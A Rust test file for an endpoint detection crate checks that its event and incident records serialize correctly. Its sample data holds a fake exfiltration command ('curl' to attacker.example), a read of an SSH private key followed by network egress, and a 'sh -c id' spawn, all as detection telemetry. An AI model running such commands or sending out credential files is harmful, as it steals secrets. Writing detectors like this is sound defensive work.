//! Core event and incident schema regression tests.

use std::collections::BTreeMap;

use skynet_edr_core::{
    Event, EventId, EventSource, Incident, IncidentId, IncidentStatus, RedactedField,
    RedactionMetadata, RedactionReason, Severity, SourceKind,
};

fn sample_redaction_metadata() -> RedactionMetadata {
    RedactionMetadata {
        contains_sensitive_data: true,
        redacted_fields: vec![RedactedField {
            path: "attributes.env.API_TOKEN".to_owned(),
            reason: RedactionReason::Secret,
            replacement: "[REDACTED:secret]".to_owned(),
        }],
    }
}

fn sample_source() -> EventSource {
    EventSource {
        kind: SourceKind::McpTool,
        sensor: "mcp-audit".to_owned(),
        integration: Some("claude-desktop".to_owned()),
    }
}

#[test]
fn event_schema_serializes_with_stable_snake_case_fields() {
    let mut attributes = BTreeMap::new();
    attributes.insert(
        "command".to_owned(),
        serde_json::json!("curl https://attacker.example/exfil"),
    );
    attributes.insert("pid".to_owned(), serde_json::json!(4242));

    let event = Event {
        id: EventId::new("evt_01HXEXAMPLE"),
        observed_at_unix_ms: 1_781_440_000_123,
        severity: Severity::High,
        source: sample_source(),
        title: "MCP tool attempted outbound network access".to_owned(),
        details: Some("Tool output requested shell execution and network egress.".to_owned()),
        attributes,
        redaction: sample_redaction_metadata(),
    };

    let value = serde_json::to_value(event).expect("event serializes to JSON");

    assert_eq!(value["id"], "evt_01HXEXAMPLE");
    assert_eq!(value["observed_at_unix_ms"], 1_781_440_000_123_u64);
    assert_eq!(value["severity"], "high");
    assert_eq!(value["source"]["kind"], "mcp_tool");
    assert_eq!(value["source"]["sensor"], "mcp-audit");
    assert_eq!(value["source"]["integration"], "claude-desktop");
    assert_eq!(value["redaction"]["contains_sensitive_data"], true);
    assert_eq!(value["redaction"]["redacted_fields"][0]["reason"], "secret");
}

#[test]
fn event_schema_round_trips_without_platform_specific_types() {
    let event_json = serde_json::json!({
        "id": "evt_01HYROUNDTRIP",
        "observed_at_unix_ms": 1_781_440_111_000_u64,
        "severity": "medium",
        "source": {
            "kind": "process",
            "sensor": "linux-ebpf",
            "integration": null
        },
        "title": "Suspicious process ancestry",
        "details": null,
        "attributes": {
            "parent_process": "python",
            "child_process": "sh",
            "argv": ["sh", "-c", "id"]
        },
        "redaction": {
            "contains_sensitive_data": false,
            "redacted_fields": []
        }
    });

    let event: Event = serde_json::from_value(event_json.clone()).expect("event JSON is accepted");
    assert_eq!(event.source.kind, SourceKind::Process);
    assert_eq!(event.severity, Severity::Medium);
    assert_eq!(
        event.attributes["argv"],
        serde_json::json!(["sh", "-c", "id"])
    );

    let serialized = serde_json::to_value(event).expect("event reserializes");
    assert_eq!(serialized, event_json);
}

#[test]
fn incident_schema_groups_events_and_tracks_status() {
    let event = Event {
        id: EventId::new("evt_01HYLATERAL"),
        observed_at_unix_ms: 1_781_440_222_000,
        severity: Severity::Critical,
        source: sample_source(),
        title: "Secret file read followed by outbound request".to_owned(),
        details: None,
        attributes: BTreeMap::from([
            (
                "file_path".to_owned(),
                serde_json::json!("/home/user/.ssh/id_rsa"),
            ),
            (
                "destination".to_owned(),
                serde_json::json!("198.51.100.10:443"),
            ),
        ]),
        redaction: sample_redaction_metadata(),
    };

    let incident = Incident {
        id: IncidentId::new("inc_01HYCHAIN"),
        created_at_unix_ms: 1_781_440_333_000,
        updated_at_unix_ms: 1_781_440_444_000,
        status: IncidentStatus::Open,
        severity: Severity::Critical,
        title: "Possible credential exfiltration".to_owned(),
        summary: "A sensitive file access was followed by network egress.".to_owned(),
        source: sample_source(),
        events: vec![event],
        redaction: sample_redaction_metadata(),
    };

    let json = serde_json::to_string(&incident).expect("incident serializes");
    assert!(json.contains("\"status\":\"open\""));
    assert!(json.contains("\"severity\":\"critical\""));
    assert!(json.contains("\"events\""));

    let round_tripped: Incident = serde_json::from_str(&json).expect("incident deserializes");
    assert_eq!(round_tripped.id.as_str(), "inc_01HYCHAIN");
    assert_eq!(round_tripped.events[0].id.as_str(), "evt_01HYLATERAL");
    assert_eq!(
        round_tripped.redaction.redacted_fields[0].replacement,
        "[REDACTED:secret]"
    );
}

#[test]
fn schema_enums_reject_unknown_values() {
    let unknown_severity = serde_json::from_str::<Severity>("\"catastrophic\"");
    assert!(unknown_severity.is_err());

    let unknown_source = serde_json::from_str::<SourceKind>("\"windows_only_etw\"");
    assert!(unknown_source.is_err());
}
